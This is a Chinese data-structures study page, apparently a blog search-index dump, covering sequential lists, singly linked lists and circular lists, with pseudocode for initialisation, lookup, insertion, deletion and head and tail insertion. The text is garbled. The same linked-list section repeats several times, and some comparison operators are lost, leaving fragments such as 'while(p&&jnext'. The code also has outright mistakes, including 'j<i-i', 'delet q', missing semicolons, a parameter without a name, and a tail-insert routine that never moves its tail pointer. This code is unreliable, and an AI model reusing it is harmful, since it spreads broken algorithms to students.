多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#顺序表优缺点"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026j\u003ci){ //向后扫描，直到p指向第i个元素或p为空 p=p-\u003enext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026j\u003ci-i){p=p-\u003enext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026j\u003ci-1){p=p-\u003enext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003cn;i++){ p=new LNode; cin\u003e\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#4链式表示和实现"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026jnext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026jnext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026jnext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#链式存储有关的术语"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026jnext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026jnext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026jnext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#如何表示空表"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026jnext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026jnext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026jnext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#设置结点有什么好处"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026jnext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026jnext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026jnext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 